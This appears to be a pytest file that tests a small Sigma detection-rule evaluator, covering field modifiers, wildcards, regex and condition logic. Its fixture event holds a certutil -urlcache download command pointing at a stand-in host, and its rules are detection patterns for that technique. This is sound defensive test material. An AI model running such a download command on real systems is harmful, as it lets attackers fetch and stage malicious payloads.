"""Unit tests for the Sigma evaluator itself."""

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
from sigma_lite import RuleError, SigmaRule  # noqa: E402


def rule(detection, category="process_creation"):
    return SigmaRule(Path("inline.yml"), {
        "title": "t", "id": "00000000-0000-0000-0000-000000000000",
        "tags": ["attack.t1105"],
        "logsource": {"product": "windows", "category": category},
        "detection": detection,
    })


EV = {"EventID": 1, "Image": r"C:\Windows\System32\CertUtil.exe",
      "CommandLine": "certutil -urlcache -f https://x.test/a"}


def test_modifiers_are_case_insensitive():
    assert rule({"s": {"Image|endswith": r"\certutil.exe"}, "condition": "s"}).matches(EV)
    assert rule({"s": {"CommandLine|startswith": "CERTUTIL"}, "condition": "s"}).matches(EV)


def test_value_list_is_or_and_all_is_and():
    assert rule({"s": {"CommandLine|contains": ["nope", "urlcache"]}, "condition": "s"}).matches(EV)
    assert not rule({"s": {"CommandLine|contains|all": ["nope", "urlcache"]}, "condition": "s"}).matches(EV)
    assert rule({"s": {"CommandLine|contains|all": ["-f", "urlcache"]}, "condition": "s"}).matches(EV)


def test_list_of_maps_is_or():
    det = {"s": [{"Image": "nope"}, {"CommandLine|contains": "urlcache"}], "condition": "s"}
    assert rule(det).matches(EV)


def test_wildcards_and_regex():
    assert rule({"s": {"Image": "*\\certutil.exe"}, "condition": "s"}).matches(EV)
    assert rule({"s": {"CommandLine|re": r"https?://"}, "condition": "s"}).matches(EV)


def test_null_means_missing():
    assert rule({"s": {"ParentImage": None}, "condition": "s"}).matches(EV)


def test_condition_logic():
    det = {
        "sel_a": {"CommandLine|contains": "urlcache"},
        "sel_b": {"CommandLine|contains": "zzz"},
        "filter": {"Image|contains": "certutil"},
    }
    assert rule({**det, "condition": "1 of sel_*"}).matches(EV)
    assert not rule({**det, "condition": "all of sel_*"}).matches(EV)
    assert not rule({**det, "condition": "sel_a and not filter"}).matches(EV)
    assert rule({**det, "condition": "(sel_b or sel_a) and filter"}).matches(EV)
    assert rule({**det, "condition": "1 of them"}).matches(EV)


def test_logsource_category_filters_event_id():
    r = rule({"s": {"CommandLine|contains": "urlcache"}, "condition": "s"})
    assert not r.matches({**EV, "EventID": 3})


def test_bad_rules_raise():
    with pytest.raises(RuleError):
        rule({"s": {"CommandLine|base64": "x"}, "condition": "s"})
    with pytest.raises(RuleError):
        rule({"s": {"CommandLine": "x"}, "condition": "s and missing"})
    with pytest.raises(RuleError):
        rule({"s": {"CommandLine": "x"}, "condition": "1 of nothing_*"})
